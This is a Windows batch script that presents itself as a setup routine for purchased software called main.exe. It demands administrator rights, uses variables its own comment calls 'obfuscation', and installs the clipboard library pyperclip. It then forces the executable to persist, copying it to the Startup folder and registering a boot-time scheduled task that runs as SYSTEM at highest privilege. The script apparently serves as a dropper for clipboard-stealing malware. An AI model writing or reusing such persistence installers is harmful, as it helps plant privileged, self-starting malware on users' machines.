@echo off
:: Ensure script is run with administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Please run this script as an administrator.
    pause
    exit
)

setlocal enabledelayedexpansion

:: Variables for functionality and basic "obfuscation"
set "v1=https://scripters.shop/"
set "v2=main.exe"
set "purchaseURL=%v1%"
set "msg1=This software requires a valid purchase from "
set "msg2=Have you bought this software from the specified website? (yes/no):"

:: Prompt user for confirmation of purchase
echo %msg1%%purchaseURL%
echo %msg2%
set /p UserResponse=

if /I "!UserResponse!" neq "yes" (
    echo Please purchase the software to continue with the setup.
    exit /b
)

:: Check system architecture
set "arch=unknown"
if "%PROCESSOR_ARCHITECTURE%"=="x86" (if not defined PROCESSOR_ARCHITEW6432 set "arch=32-bit") else set "arch=64-bit"
echo System Architecture: !arch!

:: Check for Python and pip
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python first.
    exit /b
)

:: Install required Python packages
set "installCmd=pip install pyperclip"
%installCmd%

:: Ensure x.exe exists in the script directory
set "exePath=%~dp0%v2%"
if not exist "!exePath!" (
    echo !v2! not found in script directory.
    pause
    exit
)

:: Check if x.exe is running and terminate it
tasklist | findstr /I "%v2%" >nul
if not errorlevel 1 (
    echo %v2% is currently running and will be terminated to proceed with the installation.
    taskkill /F /IM "%v2%" >nul
    :: Give the system a moment to fully terminate the process
    timeout /t 3 /nobreak >nul
)

:: Copy the executable to the startup folder for auto-start at user login
set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy "!exePath!" "!startupPath!" >nul

:: Create a scheduled task for system startup
schtasks /create /tn "StartMyApp" /tr "!exePath!" /sc ONSTART /RU SYSTEM /RL HIGHEST /F >nul
if %errorlevel% neq 0 (
    echo Failed to create a scheduled task.
    pause
    exit
) else (
    echo SUCCESS: The scheduled task "StartMyApp" has successfully been created.
)

:: Optionally, start the application immediately
start "" "!exePath!"

echo Installation and setup complete.
pause
